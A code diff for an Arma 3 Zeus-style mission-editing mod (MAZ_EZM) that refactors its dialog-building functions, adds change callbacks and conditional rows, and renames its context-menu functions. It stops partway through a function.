 				_sideCtrl ctrlAddEventHandler ["ButtonClick",{
 					params ["_sideCtrl"];
-					(_sideCtrl getVariable "params") params ["_color","_side"];
+					private _side = _sideCtrl getVariable "MAZ_EZM_SIDE";
 					private _controlGroup = ctrlParentControlsGroup _sideCtrl;
 					private _value = _controlGroup getVariable "controlValue";
 
-					private _scale = "";
-					private _alpha = "";
+					private _scale = 1;
+					private _alpha = 0.5;
 					if(_side in _value) then {
 						_value deleteAt (_value find _side);
 						_scale = 1;
@@ -381,19 +525,22 @@ comment "Dialog Creation";
 						_scale = 1.25;
 						_alpha = 1;
 					};
+					private _color = ctrlTextColor _sideCtrl;
 					_color set [3,_alpha];
 					_sideCtrl ctrlSetTextColor _color;
 					[_sideCtrl,_scale,0.1] call BIS_fnc_ctrlSetScale;
+
+					[ctrlParent _controlGroup,_value] call (_controlGroup getVariable "MAZ_EZM_onChange");
 				}];
 			} else {
 				_sideCtrl ctrlAddEventHandler ["ButtonClick",{
 					params ["_sideCtrl"];
-					(_sideCtrl getVariable "params2") params ["_controls"];
 					private _controlGroup = ctrlParentControlsGroup _sideCtrl;
 					{
-						_x params ["_ctrl","_color","_side"];
-						private _scale = "";
-						private _alpha = "";
+						private _ctrl = _x;
+						private _side = _ctrl getVariable "MAZ_EZM_SIDE";
+						private _scale = 1;
+						private _alpha = 0.5;
 						if(_ctrl isEqualTo _sideCtrl) then {
 							_scale = 1.25;
 							_alpha = 1;
@@ -402,22 +549,21 @@ comment "Dialog Creation";
 							_scale = 1;
 							_alpha = 0.5;
 						};
+						private _color = ctrlTextColor _ctrl;
 						_color set [3,_alpha];
 						_ctrl ctrlSetTextColor _color;
 						[_ctrl,_scale,0.1] call BIS_fnc_ctrlSetScale;
-					}forEach _controls;
-				}];
+					}forEach (allControls _controlGroup);
 
-				_controls pushBack [_sideCtrl, _color, _side];
+					[ctrlParent _controlGroup,_controlGroup getVariable "controlValue"] call (_controlGroup getVariable "MAZ_EZM_onChange");
+				}];
 			};
-			_sideCtrl setVariable ["params",[_color,_side]];
-			_sideCtrl setVariable ["params2",[_controls]];
-		}forEach [IDC_SIDES_OPFOR,IDC_SIDES_BLUFOR,IDC_SIDES_INDEPENDENT,IDC_SIDES_CIVILIAN];
+		}forEach [251,250,252,253];
 
 		_rowControlGroup setVariable ["controlValue", {
 			params ["_controlsGroup"];
 
-			private _ctrlSides = _controlsGroup controlsGroupCtrl IDC_ROW_SIDES;
+			private _ctrlSides = _controlsGroup controlsGroupCtrl 217;
 			_ctrlSides getVariable "controlValue"
 		}];
 
@@ -425,18 +571,28 @@ comment "Dialog Creation";
 	};
 
 	MAZ_EZM_fnc_createSliderRow = {
-		params ["_display","_defaultValue","_settings"];
-		_settings params ["_min","_max","_isPercent","_drawRadius","_radiusCenter","_radiusColor"];
+		params ["_display","_data","_onChange"];
+		_data params [
+			["_min",0,[0]],
+			["_max",100,[100]],
+			["_defaultValue",50,[50]],
+			["_drawRadius",false,[false]],
+			["_radiusCenter",objNull,[objNull,[]]],
+			["_radiusColor",[1,1,1,1],[[]]],
+			["_isPercent",false,[false]]
+		];
+
 		private _rowControlGroup = [_display] call MAZ_EZM_fnc_createRowBase;
 		_rowControlGroup setVariable ["MAZ_EZM_isPercent",_isPercent];
 
-		private _slider = _display ctrlCreate ["RscXSliderH",IDC_ROW_SLIDER,_rowControlGroup];
+		private _slider = _display ctrlCreate ["RscXSliderH",215,_rowControlGroup];
 		_slider ctrlSetPosition [(["W",10.1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),0,(["W",13.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
 		_slider ctrlSetTextColor [1,1,1,0.6];
 		_slider ctrlSetActiveColor [1,1,1,1];
 		_slider ctrlCommit 0;
+		_slider setVariable ["MAZ_EZM_onChange",_onChange];
 
-		private _sliderEdit = _display ctrlCreate ["RscEdit",IDC_ROW_EDIT,_rowControlGroup];
+		private _sliderEdit = _display ctrlCreate ["RscEdit",214,_rowControlGroup];
 		_sliderEdit ctrlSetPosition [(["W",23.7] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),pixelH,(["W",2.3] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),((["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat) - pixelH)];
 		_sliderEdit ctrlSetTextColor [1,1,1,1];
 		_sliderEdit ctrlSetBackgroundColor [0,0,0,0.2];
@@ -470,6 +626,7 @@ comment "Dialog Creation";
 		if(_isPercent) then {
 			private _text = (str (round (_defaultValue * 100))) + "%";
 			_sliderEdit ctrlSetText _text;
+			_slider sliderSetSpeed [0.1, 0.1];
 		} else {
 			_sliderEdit ctrlSetText (str _defaultValue);
 		};
@@ -478,7 +635,7 @@ comment "Dialog Creation";
 			params ["_ctrlSlider", "_value"];
 			private _controlGroup = ctrlParentControlsGroup _ctrlSlider;
 			private _isPercent = _controlGroup getVariable ["MAZ_EZM_isPercent",false];
-			private _ctrlEdit = _controlGroup controlsGroupCtrl IDC_ROW_EDIT;
+			private _ctrlEdit = _controlGroup controlsGroupCtrl 214;
 			if(_isPercent) then {
 				private _text = (str (round (_value * 100))) + "%";
 				_ctrlEdit ctrlSetText _text;
@@ -486,6 +643,8 @@ comment "Dialog Creation";
 				private _roundedValue = round _value;
 				_ctrlEdit ctrlSetText format ["%1",_roundedValue];
 			};
+			
+			[ctrlParent _ctrlSlider,round _value] call (_ctrlSlider getVariable "MAZ_EZM_onChange");
 		}];
 
 		_sliderEdit ctrlAddEventHandler ["keyUp",{
@@ -493,9 +652,9 @@ comment "Dialog Creation";
 			private _num = parseNumber (ctrlText _displayOrControl);
 			private _ctrlGroup = ctrlParentControlsGroup _displayOrControl;
 			private _isPercent = _ctrlGroup getVariable ["MAZ_EZM_isPercent",false];
-			private _sliderCtrl = _ctrlGroup controlsGroupCtrl IDC_ROW_SLIDER;
+			private _sliderCtrl = _ctrlGroup controlsGroupCtrl 215;
 			if(_isPercent) then {
-				_sliderCtrl sliderSetPosition (_num/100);
+				_sliderCtrl sliderSetPosition (round (_num/100));
 			} else {
 				_sliderCtrl sliderSetPosition _num;
 			};
@@ -503,18 +662,18 @@ comment "Dialog Creation";
 
 		_rowControlGroup setVariable ["controlValue",{
 			params ["_controlsGroup"];
-			sliderPosition (_controlsGroup controlsGroupCtrl IDC_ROW_SLIDER)
+			sliderPosition (_controlsGroup controlsGroupCtrl 215)
 		}];
 
 		_rowControlGroup
 	};
 
 	MAZ_EZM_fnc_createToolBoxRow = {
-		params ["_display","_defaultValue","_settings"];
-		_settings params ["_strings"];
+		params ["_display","_data"];
+		_data params ["_default","_strings"];
 		private _rowControlGroup = [_display] call MAZ_EZM_fnc_createRowBase;
 
-		private _ctrlToolbox = _display ctrlCreate ["RscToolBox",IDC_ROW_TOOLBOX,_rowControlGroup];
+		private _ctrlToolbox = _display ctrlCreate ["RscToolBox",216,_rowControlGroup];
 		_ctrlToolbox ctrlSetPosition [(["W",10.1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),0,(["W",15.9] call MAZ_EZM_fnc_convertToGUI_GRIDFormat),(["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat)];
 		_ctrlToolbox ctrlSetTextColor [1,1,1,1];
 		_ctrlToolbox ctrlSetBackgroundColor [0,0,0,0.3];
@@ -528,63 +687,61 @@ comment "Dialog Creation";
 			_ctrlToolbox lbSetTooltip [_index, _tooltip];
 		} forEach _strings;
 
-		if(_defaultValue isEqualType false) then {
-			_defaultValue = parseNumber _defaultValue;
+		if(_default isEqualType false) then {
+			_default = parseNumber _default;
 		};
-		_ctrlToolbox lbSetCurSel _defaultValue;
+		_ctrlToolbox lbSetCurSel _default;
+
+		_ctrlToolbox setVariable ["MAZ_EZM_onChange",_onChange];
+
+		_ctrlToolbox ctrlAddEventHandler ["ToolBoxSelChanged", {
+			params ["_control", "_selectedIndex"];
+
+			[ctrlParent _control,_selectedIndex > 0] call (_control getVariable "MAZ_EZM_onChange");
+		}];
 
 		_rowControlGroup setVariable ["controlValue", {
 			params ["_controlsGroup", "_settings"];
 
-			private _value = lbCurSel (_controlsGroup controlsGroupCtrl IDC_ROW_TOOLBOX);
-			_value = _value > 0;
-
-			_value
+			private _value = lbCurSel (_controlsGroup controlsGroupCtrl 216);
+			_value > 0
 		}];
 		
 		_rowControlGroup
 	};
 
 	MAZ_EZM_fnc_createVectorRow = {
-		params ["_display","_defaultValue","_settings"];
-		_settings params ["_labelData","_numOfEdits"];
-		_labelData params ["_labels","_labelColors"];
+		params ["_display","_data"];
+		_data params [
+			["_defaultValues",[],[[]]],
+			["_labels",[],[[]]],
+			["_numOfEdits",3,[3]]
+		];
 		private _rowControlGroup = [_display] call MAZ_EZM_fnc_createRowBase;
 
-		private ["_width","_gap"];
-		if(_numOfEdits > 3) then {
-			_numOfEdits = 3;
-		};
-		if(_numOfEdits < 2) then {
-			_numOfEdits = 2;
-		};
-		switch (_numOfEdits) do {
-			case 2: {
-				_width = 6.5;
-				_gap = 0.2;
-			};
-			case 3: {
-				_width = 4.5;
-				_gap = 0.2;
-			};
-		};
+		_numOfEdits = [_numOfEdits,2,3] call BIS_fnc_clamp;
+
+		private _labelColors = [[0.765,0.18,0.1,1],[0.575,0.815,0.22,1],[0.26,0.52,0.92,1]];
+
+		private _startingX = ["W",10] call MAZ_EZM_fnc_convertToGUI_GRIDFormat;
+		private _totalWidth = ["W",16] call MAZ_EZM_fnc_convertToGUI_GRIDFormat;
+		private _widthPerVector = _totalWidth / _numOfEdits;
+		private _labelWidth = ["W",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat;
+		private _editWidth = _widthPerVector - _labelWidth - (["W",0.2] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 
 		for "_i" from 0 to (_numOfEdits - 1) do {
-			
-			private _widthPosLabel = (_i * _width) + ((_i + 1) * (_gap * 3)) + 10;
-			private _widthPos = _widthPosLabel + 1.2;
-			_widthPos = ["W",_widthPos] call MAZ_EZM_fnc_convertToGUI_GRIDFormat;
-			_widthPosLabel = ["W",_widthPosLabel] call MAZ_EZM_fnc_convertToGUI_GRIDFormat;
+			private _labelPosX = (_widthPerVector * _i) + (["W",0.1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
+			private _editPosX = _labelPosX + (["W",1.1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 
 			private _editLabel = _display ctrlCreate ["RscStructuredText",-1,_rowControlGroup];
 			_editLabel ctrlSetStructuredText parseText (format ["<t align='center'>%1</t>",_labels select _i]);
 			_editLabel ctrlSetBackgroundColor (_labelColors select _i);
-			_editLabel ctrlSetPosition [_widthPosLabel,0,["W",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat,["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat];
+			_editLabel ctrlSetPosition [_startingX + _labelPosX,0,["W",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat,["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat];
 			_editLabel ctrlCommit 0;
 
-			private _editBox  = _display ctrlCreate ["RscEdit",IDCS_ROW_VECTOR select _i,_rowControlGroup];
-			_editBox ctrlSetText (str (_defaultValue select _i));
-			_editBox ctrlSetPosition [_widthPos,0,["W",_width - 1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat,["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat];
+			private _editBox  = _display ctrlCreate ["RscEdit",[220,221,222] select _i,_rowControlGroup];
+			_editBox ctrlSetText (str (_defaultValues select _i));
+			_editBox ctrlSetPosition [_startingX + _editPosX,0,_editWidth,["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat];
 			_editBox ctrlCommit 0;
 		};
 
@@ -598,7 +755,7 @@ comment "Dialog Creation";
 			private _numOfEdits = _controlsGroup getVariable "numOfVectorControls";
 			private _value = [];
 			for "_i" from 0 to (_numOfEdits - 1) do {
-				private _editBox = _controlsGroup controlsGroupCtrl (IDCS_ROW_VECTOR select _i);
+				private _editBox = _controlsGroup controlsGroupCtrl ([220,221,222] select _i);
 				_value pushBack (parseNumber (ctrlText _editBox));
 			};
 
@@ -610,239 +767,168 @@ comment "Dialog Creation";
 
 	MAZ_EZM_fnc_changeDisplayHeights = {
 		params ["_display"];
-		private _ctrlContent = _display displayCtrl IDC_CONTENT;
+		private _ctrlContent = _display displayCtrl 203;
 		ctrlPosition _ctrlContent params ["_posX","","_posW","_posH"];
 
 		_ctrlContent ctrlSetPositionY (0.5 - (_posH / 2));
 		_ctrlContent ctrlCommit 0;
 
-		private _ctrlTitle = _display displayCtrl IDC_TITLE;
+		private _ctrlTitle = _display displayCtrl 201;
 		_ctrlTitle ctrlSetPositionY (0.5 - (_posH / 2) - (["H",1.6] call MAZ_EZM_fnc_convertToGUI_GRIDFormat));
 		_ctrlTitle ctrlCommit 0;
 
-		private _ctrlBG = _display displayCtrl IDC_BACKGROUND;
+		private _ctrlBG = _display displayCtrl 202;
 		_ctrlBG ctrlSetPositionY (0.5 - (_posH / 2) - (["H",0.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat));
 		_ctrlBG ctrlSetPositionH (_posH + (["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat));
 		_ctrlBG ctrlCommit 0;
 
-		private _ctrlOkBtn = _display displayCtrl IDC_CONFIRM;
+		private _ctrlOkBtn = _display displayCtrl 204;
 		_ctrlOkBtn ctrlSetPositionY (0.5 + (_posH / 2) + (["H",0.6] call MAZ_EZM_fnc_convertToGUI_GRIDFormat));
 		_ctrlOkBtn ctrlCommit 0;
 
-		private _ctrlCancelBtn = _display displayCtrl IDC_CANCEL;
+		private _ctrlCancelBtn = _display displayCtrl 205;
 		_ctrlCancelBtn ctrlSetPositionY (0.5 + (_posH / 2) + (["H",0.6] call MAZ_EZM_fnc_convertToGUI_GRIDFormat));
 		_ctrlCancelBtn ctrlCommit 0;
 	};
 
+	MAZ_EZM_fnc_updateDialog = {
+		params ["_display","_controls"];
+		private _ctrlContent = _display displayCtrl 203;
+		while {!isNull _display} do {
+			private _height = 0;
+			{
+				_x params ["_ctrlGroup","_condition"];
+				if(typeName _condition == "STRING") then {
+					_condition = compile _condition;
+				};
+				if([_display] call _condition) then {
+					_ctrlGroup ctrlShow true;
+					_ctrlGroup ctrlSetPositionY _height;
+					_ctrlGroup ctrlCommit 0;
+					_height = (_height + (ctrlPosition _ctrlGroup select 3) + (["H",0.1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat));
+				} else {
+					_ctrlGroup ctrlShow false;
+				};
+			}forEach _controls;
+
+			_ctrlContent ctrlSetPositionH (_height - (["H",0.1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat));
+			_ctrlContent ctrlCommit 0;
+
+			[_display] call MAZ_EZM_fnc_changeDisplayHeights;
+
+			sleep 0.1;
+		};
+	};
+
 	MAZ_EZM_fnc_createDialog = {
 		params [
-			["_title","",[""]],
+			["_title","Module Dialog",[""]],
 			["_content",[],[[]]],
 			["_onConfirm",{},[{}]],
 			["_onCancel",{},[{}]],
-			["_args",[]]
+			["_args",[]],
+			["_onLoad",{},[{}]]
 		];
 
-		private _controlsData = [];
-		{
-			_x params [
-				["_type","",[""]],
-				["_name",[],["",[]]],
-				["_value",[]]
-			];
-			_name params [["_label","",[""]],["_toolTip","",[""]]];
-
-			(toUpper _type splitString ":") params [["_type",""],["_subType",""]];
-
-			private ["_defaultValue","_controlType","_settings"];
-
-			switch (_type) do {
-				case "COMBO": {
-					_value params [["_values",[],[[]]],["_labels",[],[[]]],["_defaultIndex",0,[0]]];
-					if(_values isEqualTo []) then {
-						{
-							_values pushBack _forEachIndex;
-						} forEach _labels;
-					};
-
-					_defaultValue = _values param [_defaultIndex];
-					_controlType = MAZ_EZM_fnc_createComboRow;
-
-					private _entries = [];
-					for "_i" from 0 to (count _values - 1) do {
-						(_labels select _i) params [["_text","",[""]],["_tooltip","",[""]],["_picture","",[""]],["_textColor",[1,1,1,1],[[]],4]];
-						_entries pushBack [_values select _i,_text,_tooltip,_picture,_textColor];
-					};
-
-					_settings = [_entries];
-				};
-				case "EDIT": {
-					_value params [["_default",""],["_height",5,[0]]];
-					if!(_default isEqualType "") then {
-						_default = str _default;
-					};
-
-					_defaultValue = _default;
-
-					_controlType = switch (_subType) do {
-						case "MULTI": {
-							MAZ_EZM_fnc_createEditMultiRow
-						};
-						case "CODE": {
-							MAZ_EZM_fnc_createEditCodeRow
-						};
-						default {
-							MAZ_EZM_fnc_createEditRow
-						};
-					};
-
-					private _isMulti = _subType in ["MULTI","CODE"];
-					_settings = [_height];
-				};
-				case "LIST": {
-					_value params [["_values",[],[[]]],["_labels",[],[[]]],["_defaultIndex",0,[0]],["_height",6,[0]],["_sort",false,[false]]];
-
-					if(_values isEqualTo []) then {
-						{
-							_values pushBack _forEachIndex;
-						}forEach _labels;
-					};
-
-					_defaultValue = _values param [_defaultIndex];
-					_controlType = MAZ_EZM_fnc_createListRow;
-
-					private _entries = [];
-					for "_i" from 0 to (count _values - 1) do {
-						(_labels select _i) params [["_text","",[""]],["_tooltip","",[""]],["_picture","",[""]],["_textColor",[1,1,1,1],[[]],4]];
-						_entries pushBack [_values select _i,_text,_tooltip,_picture,_textColor];
-					};
-
-					_settings = [_entries,_height];
-				};
-				case "SIDES": {
-					_defaultValue = [_value] param [0,west,[west,[]]];
-					_controlType = MAZ_EZM_fnc_createSidesRow;
-					_settings = [];
-				};
-				case "SLIDER": {
-					_value params [
-						["_min",0,[0]],
-						["_max",1,[0]],
-						["_default",0,[0]],
-						["_radiusCenter",objNull,[objNull,[]], 3],
-						["_radiusColor",[1,1,1,0.7],[[]], 4],
-						["_isPercent",false,[false]]
-					];
-
-					_defaultValue = _default;
-					_controlType = MAZ_EZM_fnc_createSliderRow;
-
-					private _drawRadius = _subType == "RADIUS" && {_radiusCenter isNotEqualTo objNull};
-					if(_isPercent) then {
-						_radiusCenter = objNull;
-					};
-
-					_settings = [_min,_max,_isPercent,_drawRadius,_radiusCenter,_radiusColor];
-				};
-				case "TOOLBOX": {
-					_value params [["_default",0,[0,false]],["_strings",[],[[]]]];
-
-					switch (_subType) do {
-						case "YESNO": {
-							_strings = [["NO",""],["YES",""]];
-						};
-						case "ENABLED": {
-							_strings = [["DISABLE",""],["ENABLE",""]];
-						};
-					};
-
-					_defaultValue = _default;
-					_controlType = MAZ_EZM_fnc_createToolBoxRow;
-
-					_settings = [_strings];
-				};
-				case "VECTOR": {
-					_value params [
-						["_default",[0,0,0],[[]]],
-						["_labels",["X","Y","Z"],[[]]],
-						["_numOfEdits",3,[3]]
-					];
-					private _labelData = [_labels,[[0.765,0.18,0.1,1],[0.575,0.815,0.22,1],[0.26,0.52,0.92,1]]];
-
-					_defaultValue = _default;
-					_controlType = MAZ_EZM_fnc_createVectorRow;
-
-					_settings = [_labelData,_numOfEdits];
-				};
-			};
-			_controlsData pushBack [_controlType,_label,_tooltip,_defaultValue,_settings];
-		} forEach _content;
-
 		private _display = [] call MAZ_EZM_fnc_createDialogBase;
-		_display setVariable ['MAZ_EZM_onAttribsCancel',_onCancel];
-		_display setVariable ['MAZ_EZM_onAttribsConfirm',_onConfirm];
 
 		if(isNull _display) exitWith {false};
 
-		private _ctrlTitle = _display displayCtrl IDC_TITLE;
+		private _ctrlTitle = _display displayCtrl 201;
 		_ctrlTitle ctrlSetText (toUpper _title);
 
-		private _ctrlContent = _display displayCtrl IDC_CONTENT;
+		private _ctrlContent = _display displayCtrl 203;
 		private _contentPosY = 0;
 		private _controls = [];
-
+		
+		private _error = "";
 		{
-			_x params ["_controlType","_label","_tooltip","_defaultValue","_settings"];
+			_x params [
+				["_type","",[""]],
+				["_label","",["",[]]],
+				["_data",[],[[],west]],
+				["_condition",{true},[{},""]],
+				["_onChange",{{}},[{},""]]
+			];
 
-			private _controlsGroup = [_display,_defaultValue,_settings] call _controlType;
+			_label params [["_label","",[""]],["_toolTip","",[""]]];
 
-			private _ctrlLabel = _controlsGroup controlsGroupCtrl IDC_ROW_LABEL;
+			(toUpper _type splitString ":") params [["_type",""],["_subType",""]];
+
+			private _result = switch (_type) do {
+				case "COLOR": {
+					[_display,_data,_onChange] call MAZ_EZM_fnc_createColorRow;
+				};
+				case "COMBO": {
+					[_display,_data,_onChange] call MAZ_EZM_fnc_createComboRow;
+				};
+				case "EDIT": {
+					private _fnc = switch (_subType) do {
+						case "MULTI": {
+							MAZ_EZM_fnc_createEditMultiRow
+						};
+						default {MAZ_EZM_fnc_createEditRow};
+					};
+					[_display,_data,_onChange] call _fnc;
+				};
+				case "LIST": {
+					[_display,_data,_onChange] call MAZ_EZM_fnc_createListRow;
+				};
+				case "SIDES": {
+					[_display,_data,_onChange] call MAZ_EZM_fnc_createSidesRow;
+				};
+				case "SLIDER": {
+					_data params ["_min","_max","_default","_radiusCenter","_radiusColor","_isPercent"];
+					private _drawRadius = (typeName _radiusCenter isEqualTo "OBJECT" && {!isNull _radiusCenter}) || typeName _radiusCenter == "ARRAY";
+					_data insert [3,[_drawRadius]];
+					[_display,_data,_onChange] call MAZ_EZM_fnc_createSliderRow;
+				};
+				case "TOOLBOX": {
+					switch (_subType) do {
+						case "YESNO": {
+							_data set [1,[["NO",""],["YES",""]]];
+						};
+						case "ENABLED": {
+							_data set [1,[["DISABLE",""],["ENABLE",""]]];
+						};
+					};
+					[_display,_data,_onChange] call MAZ_EZM_fnc_createToolBoxRow;
+				};
+				case "VECTOR": {
+					[_display,_data,_onChange] call MAZ_EZM_fnc_createVectorRow;
+				};
+				default {
+					_error = _error + (format ["Wrong content type %1. ",_type]);
+					false;
+				};
+			};
+			if(typeName _result == "BOOL" && {!_result}) then {
+				_error = _error + (format ["%1 data was incorrect for %2. ",_type,_label]);
+				continue;
+			};
+
+			private _ctrlLabel = _result controlsGroupCtrl 211;
 			_ctrlLabel ctrlSetText (format ["%1",_label]);
-			_ctrlLabel ctrlSetTooltip _tooltip;
+			_ctrlLabel ctrlSetTooltip _toolTip;
 
-			_controlsGroup ctrlSetPositionY _contentPosY;
-			_controlsGroup ctrlCommit 0;
+			_controls pushBack [_result,_condition];
 
-			_contentPosY = (_contentPosY + (ctrlPosition _controlsGroup select 3) + (["H",0.1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat));
+		}forEach _content;
 
-			_controls pushBack [_controlsGroup, _settings];
-		} forEach _controlsData;
+		if(_error != "") exitWith {
+			_display closeDisplay 3;
+			systemChat format ["[ ERROR ] : %1",_error];
+			playSound "addItemFailed";
+		};
 
-		_ctrlContent ctrlSetPositionH (_contentPosY - (["H",0.1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat));
-		_ctrlContent ctrlCommit 0;
+		[_display,_controls] call _onLoad;
 
-		[_display] call MAZ_EZM_fnc_changeDisplayHeights;
+		[_display,_controls] spawn MAZ_EZM_fnc_updateDialog;
 
 		_display setVariable ["MAZ_moduleMenuInfo",[_controls,_onConfirm,_onCancel,_args]];
+
+		true;
 	};
-
-	MAZ_EZM_fnc_defineDialogIDCS = {
-		IDC_TITLE = 201;
-		IDC_BACKGROUND = 202;
-		IDC_CONTENT = 203;
-		IDC_CONFIRM = 204;
-		IDC_CANCEL = 205;
-
-		IDC_ROW_GROUP = 210;
-		IDC_ROW_LABEL = 211;
-		IDC_ROW_CHECKBOX = 212;
-		IDC_ROW_COMBO = 213;
-		IDC_ROW_EDIT = 214;
-		IDC_ROW_SLIDER = 215;
-		IDC_ROW_TOOLBOX = 216;
-		IDC_ROW_SIDES = 217;
-		IDC_ROW_VECTOR_X = 220;
-		IDC_ROW_VECTOR_Y = 221;
-		IDC_ROW_VECTOR_Z = 222;
-
-		IDC_SIDES_BLUFOR = 250;
-		IDC_SIDES_OPFOR = 251;
-		IDC_SIDES_INDEPENDENT = 252;
-		IDC_SIDES_CIVILIAN = 253;
-
-		IDCS_ROW_VECTOR = [IDC_ROW_VECTOR_X,IDC_ROW_VECTOR_Y,IDC_ROW_VECTOR_Z];
-	};
-	[] call MAZ_EZM_fnc_defineDialogIDCS;
 
 comment "Attributes Dialog Creation";
 
@@ -876,7 +962,7 @@ comment "Attributes Dialog Creation";
 		_label ctrlSetPositionX (["X",6.5] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_label ctrlSetPositionW (["W",27] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
 		_label ctrlSetPositionH (["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat);
-		_label ctrlSetBackgroundColor [0,0.5,0.5,1];
+		_label ctrlSetBackgroundColor EZM_dialogColor;
 		_label ctrlSetText _labelText;
 		_label ctrlCommit 0;
 
@@ -1061,7 +1147,7 @@ comment "Attributes Dialog Creation";
 		private _sliderEdit = _display ctrlCreate ["RscEdit",IDC_ATTRIBS_SLIDER_EDIT,_rowControlsGroup];
 		_sliderEdit ctrlSetPosition [["W",23.1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat,pixelH,["W",2.9] call MAZ_EZM_fnc_convertToGUI_GRIDFormat,((["H",1] call MAZ_EZM_fnc_convertToGUI_GRIDFormat) - pixelH)];
 		if(_isPercent) then {
-			_sliderEdit ctrlSetText ((str (_default * 100)) + "%");
+			_sliderEdit ctrlSetText ((str (round (_default * 100))) + "%");
 		} else {
 			_sliderEdit ctrlSetText (str _default);
 		};
@@ -1593,13 +1679,13 @@ comment "Attributes Dialog Creation";
 	MAZ_EZM_applyAttributeChangesToMan = {
 		params ["_unit","_attributes"];
 		_attributes params ["_name","_rank","_stance","_health","_skill","_respawn"];
-		[_unit,_name] remoteExec ['setName',0,_unit];
-		_unit setRank _rank;
-		_unit setUnitPos _stance;
+		[_unit,_name] remoteExec ['setName'];
+		[_unit,_rank] remoteExec ["setRank"];
+		[_unit,_stance] remoteExec ["setUnitPos"];
 		MAZ_EZM_stanceForAI = _stance;
 		_unit setDamage (1 - _health);
 		if(!(_unit getVariable ["MAZ_EZM_doesHaveCustomSkills",false])) then {
-			_unit setSkill _skill;
+			[_unit, _skill] remoteExec ["setSkill"];
 		};
 
 		[_unit,_respawn] call MAZ_EZM_applyCreateRespawnToUnitAttribs;
@@ -2424,10 +2510,10 @@ comment "Attributes Dialog Creation";
 		params ["_vehicle","_attributes"];
 		_attributes params [["_health",damage _vehicle],["_fuel",fuel _vehicle],["_lockState",locked _vehicle],["_engineState",isEngineOn _vehicle],["_lightState",isLightOn _vehicle],"_respawn"];
 		_vehicle setDamage (1-_health);
-		_vehicle setFuel _fuel;
-		_vehicle lock _lockState;
-		_vehicle engineOn _engineState;
-		_vehicle setPilotLight _lightState;
+		[_vehicle,_fuel] remoteExec ["setFuel"];
+		[_vehicle,_lockState] remoteExec ["lock"];
+		[_vehicle,_engineState] remoteExec ["engineOn"];
+		[_vehicle,_lightState] remoteExec ["setPilotLight"];
 
 		[_vehicle,_respawn] call MAZ_EZM_applyCreateRespawnToUnitAttribs;
 	};
@@ -2560,11 +2646,11 @@ comment "Attributes Dialog Creation";
 		params ["_vehicle","_attributes"];
 		_attributes params [["_health",damage _vehicle],["_fuel",fuel _vehicle],["_lockState",locked _vehicle],["_engineState",isEngineOn _vehicle],["_lightState",isLightOn _vehicle],["_colLightState",isCollisionLightOn _vehicle],"_respawn"];
 		_vehicle setDamage (1-_health);
-		_vehicle setFuel _fuel;
-		[_vehicle,_lockState] remoteExec ['lock',0,_vehicle];
-		_vehicle engineOn _engineState;
-		_vehicle setPilotLight _lightState;
-		_vehicle setCollisionLight _colLightState;
+		[_vehicle,_fuel] remoteExec ["setFuel"];
+		[_vehicle,_lockState] remoteExec ["lock"];
+		[_vehicle,_engineState] remoteExec ["engineOn"];
+		[_vehicle,_lightState] remoteExec ["setPilotLight"];
+		[_vehicle,_colLightState] remoteExec ["setCollisionLight"];
 
 		[_vehicle,_respawn] call MAZ_EZM_applyCreateRespawnToUnitAttribs;
 	};
@@ -2884,7 +2970,7 @@ comment "Attributes Dialog Creation";
 
 comment "Context Menu";
 
-	ZAM_fnc_createNewContextAction = {
+	MAZ_EZM_fnc_createNewContextAction = {
 		params [
 			["_displayName","CONTEXT ACTION",[""]],
 			["_code",{},[{}]],
@@ -2894,39 +2980,39 @@ comment "Context Menu";
 			["_color",[1,1,1,1],[[]]],
 			["_childActions",[],[[]]]
 		];
-		if(isNil "ZAM_EZM_contextMenuActions") then {
-			ZAM_EZM_contextMenuActions = [];
+		if(isNil "MAZ_EZM_contextMenuActions") then {
+			MAZ_EZM_contextMenuActions = [];
 		};
-		private _index = ZAM_EZM_contextMenuActions pushBack [_displayName,_code,_condition,_priority,_img,_color,_childActions];
+		private _index = MAZ_EZM_contextMenuActions pushBack [_displayName,_code,_condition,_priority,_img,_color,_childActions];
 		_index
 	};
 
-	ZAM_fnc_removeContextAction = {
+	MAZ_EZM_fnc_removeContextAction = {
 		params ["_index"];
-		if(_index < 0 || _index >= (count ZAM_EZM_contextMenuActions)) exitWith {
+		if(_index < 0 || _index >= (count MAZ_EZM_contextMenuActions)) exitWith {
 			["Failed to remove action","addItemFailed"] call MAZ_EZM_fnc_systemMessage;
 		};
-		ZAM_EZM_contextMenuActions set [_index,nil];
+		MAZ_EZM_contextMenuActions set [_index,nil];
 	};
 
-	ZAM_fnc_createContextMenuBase = {
+	MAZ_EZM_fnc_createContextMenuBase = {
 		params ["_xPos","_yPos"];
 		
 		private _display = findDisplay 312;
 		MAZ_EZM_contextMenuBase = _display ctrlCreate ["RscControlsGroupNoScrollbars",-1];
 		MAZ_EZM_contextMenuBase ctrlSetPosition [_xPos,_yPos,["W",9] call MAZ_EZM_fnc_convertToGUI_GRIDFormat,0];
